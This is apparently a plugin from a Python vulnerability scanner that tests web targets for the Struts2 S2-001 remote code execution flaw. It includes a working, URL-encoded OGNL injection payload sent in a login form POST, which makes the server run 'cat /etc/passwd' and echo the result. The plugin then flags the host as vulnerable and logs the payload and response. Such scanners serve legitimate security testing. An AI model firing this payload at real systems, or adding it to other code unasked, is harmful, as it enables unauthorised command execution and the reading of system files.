#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,ErrorHandling,Proxies
import urllib3
import urllib.parse
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-6-14"  # 插件编辑时间
        self.info['disclosure']='2010-3-11'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability1"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞1' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = "该漏洞其实是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL表达式解析，所以可以直接构造Payload进行命令执行"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "Struts2.0.0-Struts2.0.8"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果
class UrlProcessing:  # URL处理函数
    def result(self, url):
        if url.startswith("http"):  # 判断是否有http头，如果没有就在下面加入
            res = urllib.parse.urlparse(url)
        else:
            res = urllib.parse.urlparse('http://%s' % url)
        return res.scheme, res.hostname, res.port,res.path



def medusa(Url:str,RandomAgent:str,proxies:str=None,**kwargs)->None:
    proxies=Proxies().result(proxies)
    scheme, url, port,path = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    payload = '''username=medusa&password=%25%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%22cat%22%2c%22%2fetc%2fpasswd%22%7d)).redirectErrorStream(true).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew+java.io.InputStreamReader(%23b)%2c%23d%3dnew+java.io.BufferedReader(%23c)%2c%23e%3dnew+char%5b50000%5d%2c%23d.read(%23e)%2c%23f%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2c%23f.getWriter().println(new+java.lang.String(%23e))%2c%23f.getWriter().flush()%2c%23f.getWriter().close()%7d'''
    payload_url = scheme+"://"+url+':'+str(port)+path

    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'User-Agent': RandomAgent,
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    try:
        resp = requests.post(payload_url, data=payload,headers=headers, proxies=proxies,timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if code==200 and con.find('root:')!=-1 and con.find('/bin/bash')!=-1 and con.find('bin:')!=-1:
            Medusa = "{}存在Struts2远程代码执行漏洞(S2-001)\r\n漏洞详情:\r\n版本号:S2-001\r\nPayload:{}\r\n返回数据包:{}\r\n".format(url,payload,con)
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url, **kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        ErrorLog().Write("Plugin Name:" + _ + " || Target Url:" + url, e)  # 调用写入类传入URL和错误插件名

